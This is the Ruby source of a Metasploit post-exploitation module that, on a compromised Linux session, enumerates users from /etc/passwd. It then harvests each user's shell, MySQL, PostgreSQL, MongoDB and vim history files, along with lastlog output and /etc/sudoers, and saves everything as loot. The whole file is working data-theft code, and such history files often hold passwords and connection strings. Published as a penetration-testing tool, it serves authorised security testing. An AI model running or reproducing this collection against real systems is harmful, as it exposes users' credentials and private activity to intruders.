##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
        'Name'         => 'Linux Gather User History',
        'Description'  => %q{
          This module gathers user specific information.
          User shell history, MySQL history, PostgreSQL history,
          MongoDB history, vim history, lastlog and sudoers.
        },
        'License'      => MSF_LICENSE,
        'Author'       =>
          [
            # based largely on get_bash_history function by Stephen Haywood
            'ohdae <bindshell[at]live.com>'
          ],
        'Platform'     => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter']
      ))
  end

  def run
    distro = get_sysinfo

    print_good('Info:')
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    user = execute('/usr/bin/whoami')
    users = execute('/bin/cat /etc/passwd | cut -d : -f 1').chomp.split
    users = [user] if user != 'root' || users.blank?

    vprint_status("Retrieving history for #{users.length} users")
    shells = %w{ ash bash csh ksh sh tcsh zsh }
    users.each do |u|
      shells.each do |shell|
        get_shell_history(u, shell)
      end
      get_mysql_history(u)
      get_psql_history(u)
      get_mongodb_history(u)
      get_vim_history(u)
    end

    last = execute('/usr/bin/last && /usr/bin/lastlog')
    sudoers = cat_file('/etc/sudoers')
    save('Last logs', last) unless last.blank?
    save('Sudoers', sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/
  end

  def save(msg, data, ctype = 'text/plain')
    ltype = 'linux.enum.users'
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot.to_s}")
  end

  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo['Computer']
    when /shell/
      host = session.shell_command_token('hostname').chomp
    end
    print_status("Running module against #{host}")
    host
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    output
  end

  def get_shell_history(user, shell)
    return if shell.nil?
    vprint_status("Extracting #{shell} history for #{user}")
    if user == 'root'
      hist = cat_file("/root/.#{shell}_history")
    else
      hist = cat_file("/home/#{user}/.#{shell}_history")
    end
    save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
  end

  def get_mysql_history(user)
    vprint_status("Extracting MySQL history for #{user}")
    if user == 'root'
      sql_hist = cat_file('/root/.mysql_history')
    else
      sql_hist = cat_file("/home/#{user}/.mysql_history")
    end
    save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
  end

  def get_psql_history(user)
    vprint_status("Extracting PostgreSQL history for #{user}")
    if user == 'root'
      sql_hist = cat_file('/root/.psql_history')
    else
      sql_hist = cat_file("/home/#{user}/.psql_history")
    end
    save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
  end

  def get_mongodb_history(user)
    vprint_status("Extracting MongoDB history for #{user}")
    if user == 'root'
      sql_hist = cat_file('/root/.dbshell')
    else
      sql_hist = cat_file("/home/#{user}/.dbshell")
    end
    save("MongoDB History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
  end

  def get_vim_history(user)
    vprint_status("Extracting VIM history for #{user}")
    if user == 'root'
      vim_hist = cat_file('/root/.viminfo')
    else
      vim_hist = cat_file("/home/#{user}/.viminfo")
    end
    save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
  end
end
